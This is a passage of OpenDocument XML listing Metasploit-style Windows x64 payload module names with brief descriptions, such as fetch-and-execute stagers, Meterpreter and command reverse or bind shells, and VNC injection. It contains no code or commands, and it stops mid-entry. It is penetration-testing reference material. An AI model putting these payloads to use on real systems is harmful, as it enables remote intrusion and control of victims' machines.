      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp_uuid <text:s text:c="22"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection with UUID Support (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_http <text:s text:c="23"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ninet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_https <text:s text:c="22"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ninet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_named_pipe <text:s text:c="17"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker via a named pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_rc4 <text:s text:c="20"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_uuid <text:s text:c="19"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_winhttp <text:s text:c="20"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_winhttps <text:s text:c="19"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTPS (Windows x64 w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>inhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/exec <text:s text:c="7"/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an http server. Execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an arbitrary command (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/loadlibrar <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>y <text:s text:c="31"/>d from an http server. Load an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>arbitrary x64 library path</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/messagebox <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dialog via MessageBox using a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ustomizable title, text &amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_ipv6_tcp <text:s text:c="17"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_ipv6_tcp_uuid <text:s text:c="12"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_named_pipe <text:s text:c="15"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_tcp <text:s text:c="22"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_tcp_rc4 <text:s text:c="18"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_tcp_uuid <text:s text:c="17"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_http <text:s text:c="18"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_https <text:s text:c="17"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_named_pipe <text:s text:c="12"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker via a name</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_tcp <text:s text:c="19"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_tcp_rc4 <text:s text:c="15"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_tcp_uuid <text:s text:c="14"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_winhttp <text:s text:c="15"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_winhttps <text:s text:c="14"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTPS (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_bind_named_pipe <text:s text:c="15"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>to victim and spawn a Meterpret</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er shell. Requires Windows XP S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_bind_tcp <text:s text:c="22"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>to victim and spawn a Meterpret</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er shell. Requires Windows XP S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_http <text:s text:c="18"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a Me</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>terpreter shell. Requires Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_https <text:s text:c="17"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a Me</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>terpreter shell. Requires Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_ipv6_tcp <text:s text:c="14"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a Me</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>terpreter shell. Requires Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_tcp <text:s text:c="19"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a Me</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>terpreter shell. Requires Windo</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ws XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp <text:s text:c="20"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp_uuid <text:s text:c="15"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_named_pipe <text:s text:c="18"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp <text:s text:c="25"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_rc4 <text:s text:c="21"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_uuid <text:s text:c="20"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_named_pipe <text:s text:c="15"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker via a name</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_rc4 <text:s text:c="18"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_uuid <text:s text:c="17"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/pingback_r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and report UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/powershell <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_bind_tcp <text:s text:c="23"/>d from an http server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/powershell <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp <text:s text:c="20"/>d from an http server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/powershell <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp_ssl <text:s text:c="16"/>d from an http server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp <text:s text:c="23"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp_uuid <text:s text:c="18"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection with UUID Support (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_named_pipe <text:s text:c="21"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for a pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_rc4 <text:s text:c="24"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_uuid <text:s text:c="23"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction with UUID Support (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp <text:s text:c="25"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_rc4 <text:s text:c="21"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell/reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_uuid <text:s text:c="20"/>d from an http server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker with UUID Support (W</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>indows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell_bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/shell_reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp <text:s text:c="25"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp <text:s text:c="19"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp_uuid <text:s text:c="14"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_named_pipe <text:s text:c="17"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="24"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_rc4 <text:s text:c="20"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_uuid <text:s text:c="19"/>d from an http server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="20"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="19"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_rc4 <text:s text:c="17"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
